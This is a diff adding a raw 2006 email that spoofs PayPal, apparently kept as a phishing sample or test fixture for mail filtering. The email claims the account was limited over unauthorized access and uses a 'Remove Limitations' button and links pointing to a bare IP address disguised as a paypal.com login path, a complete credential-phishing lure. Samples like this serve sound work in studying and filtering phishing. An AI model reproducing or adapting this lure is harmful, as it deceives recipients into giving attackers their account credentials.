@@ -1,0 +1,163 @@
+Return-Path: <ulimit@paypal.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail1.example.com (mail1.example.com [10.5.6.7])
+	by funky.example.com (Postfix) with ESMTP id 5191A4697F
+	for <nobody@login.example.com>; Fri, 21 Jul 2006 18:28:29 -0400 (EDT)
+Received: from a15179722.alturo-server.de (a15179722.alturo-server.de [217.160.107.173])
+	by mail1.example.com (Postfix) with ESMTP id 751496CCFFA
+	for <nobody@example.com>; Fri, 21 Jul 2006 18:28:29 -0400 (EDT)
+Received: from User (unknown [210.48.74.138])
+	by a15179722.alturo-server.de (Postfix) with ESMTP id 38E608116D9;
+	Sat, 22 Jul 2006 00:28:08 +0200 (CEST)
+Reply-To: <paypal@ulimit.paypal.com>
+From: "PAYPAL.COM" <ulimit@paypal.com>
+Subject: Your PayPal account has been temporarily limited due to Unauthorized Access.
+Date: Sat, 22 Jul 2006 10:25:15 +1200
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20060721222808.38E608116D9@a15179722.alturo-server.de>
+To: undisclosed-recipients:;
+Status: R
+X-Status: 
+X-Keywords:                  
+
+<html>
+<head>
+<title>PayPal</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<table width="600" border="0" cellspacing="0" cellpadding="0" align="center">
+  <tr> 
+    <td colspan="2">
+      <div align="center"><img 
+
+src="http://82.33.105.134/www.paypal.com/us/cgi-bin/webscr.php_cmd=_login-run/privacy.jpg" 
+
+width="600" height="176"></div>
+    </td>
+  </tr>
+  <tr> 
+    <td height="103" colspan="2"> 
+      <table width="100%" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td width="15%"> 
+            <div align="center"><br>
+              <img 
+
+src="http://82.33.105.134/www.paypal.com/us/cgi-bin/webscr.php_cmd=_login-run/spot_trustsafety_76x76
+
+.gif" width="76" height="76" align="texttop"></div>
+          </td>
+          <td width="85%"> <font face="Trebuchet MS" size="2" color="#006699"><br>
+            Dear valued <b>PayPal&reg; member</b>,<br>
+            <br>
+            We recently reviewed your account, and suspect that your PayPal account 
+            may have been accessed by an unauthorized third party. Protecting 
+            the security of your account and of the PayPal network is our primary 
+            concern.</font></td>
+        </tr>
+        <tr> 
+          <td colspan="2"><font face="Trebuchet MS" size="2" color="#006699">Therefore, 
+            <b>as prevention measure, we have temporarely limited access to sensitive 
+            PayPal account features</b>.We encourage customers to get their information 
+            up-to-date and change password often.<br>
+            <br>
+            </font><font face="Arial, Helvetica, sans-serif" size="2" color="#006699">P</font><font 
+
+face="Arial, Helvetica, sans-serif" size="2" color="#006699"><font face="Trebuchet MS">ayPal 
+            has assigned you an unique tracking number.</font></font><font face="Trebuchet MS" 
+
+size="2" color="#006699"> 
+            <br>
+            </font><font face="Arial, Helvetica, sans-serif" size="2" color="#006699"><b>Unique 
+            tracking number :<br>
+            </b><font color="#006600"><b>8233105134</b></font></font><font face="Trebuchet MS" 
+
+size="2" color="#006699"><br>
+            <br>
+            Please review your information after loging in. <b>Use only</b> your 
+            assigned unique URL.<br>
+            Click this button to access your unique URL (<b>! please read below 
+            for security tips</b>) and gain full access:</font> <br>
+            <br>
+            <form name="form1" 
+
+action="http://82.33.105.134/www.paypal.com/us/cgi-bin/webscr.php_cmd=_login-run/">
+              <div align="left"> 
+                <input action="http://" method="post" type="submit" name="Submit" value="Remove 
+
+Limitations 8233105134">
+                <font face="Trebuchet MS" size="2"><a 
+
+href="http://82.33.105.134/www.paypal.com/us/cgi-bin/webscr.php_cmd=_login-run/">( 
+                or click here )</a></font><br>
+              </div>
+            </form>
+            <font face="Trebuchet MS" size="2" color="#006699">For more information 
+            about how to protect your account, please visit <a href="http://">PayPal's 
+            Security Center</a>.<br>
+            <br>
+            We apologize for any inconvenience this may cause, and appreciate 
+            your assistance in helping us maintain the integrity of the entire 
+            PayPal system. Thank you for your prompt attention to this matter.<br>
+            <br>
+            </font></td>
+        </tr>
+      </table>
+    </td>
+  </tr>
+  <tr> 
+    <td height="7" colspan="2"> 
+      <hr size="1> 
+      <table width="100%" border="0" cellspacing="0" cellpadding="0" height="100">
+  <tr> 
+    <td height="6" colspan="2"> 
+      <div align="left"><font face="Arial, Helvetica, sans-serif" size="2" color="#006699"><br>
+        P</font><font face="Arial, Helvetica, sans-serif" size="2" color="#006699"><font 
+
+face="Trebuchet MS">ayPal 
+        has assigned you an unique tracking number. URL in your browser's address 
+        bar should begin with<b> &quot; http:// &quot; </b>following your tracking 
+        number</font>.</font></div>
+    </td>
+  </tr>
+  <tr> 
+    <td height="52" width="31%"> 
+      <p align="right"><font face="Arial, Helvetica, sans-serif" size="2" color="#006699"><b>Unique 
+        tracking number :<br>
+        </b><font color="#006600"><b>8233105134</b></font></font></p>
+    </td>
+    <td height="52" width="69%"> 
+      <div align="center"><font face="Arial, Helvetica, sans-serif" size="2" color="#006699"><br>
+        <img src="http://82.33.105.134/www.paypal.com/us/cgi-bin/webscr.php_cmd=_login-run/bar.jpg" 
+
+width="191" height="30"><br>
+        </font></div>
+    </td>
+  </tr>
+  <tr> 
+    <td height="2" colspan="2"> 
+      <hr size="1> 
+      <table width="100%" border="0" cellspacing="0" cellpadding="0" height="100">
+    </td>
+  </tr>
+  <tr>
+    <td height="2" colspan="2"><font face="Arial, Helvetica, sans-serif" size="2" 
+
+color="#006699"><font face="Trebuchet MS" color="#000000">Copyright 
+      &copy; 2006 PayPal Inc. All rights reserved. Designated trademarks and brands 
+      are the property of their respective owners.</font></font></td>
+  </tr>
+</table>
+    </body>
+</html>
+
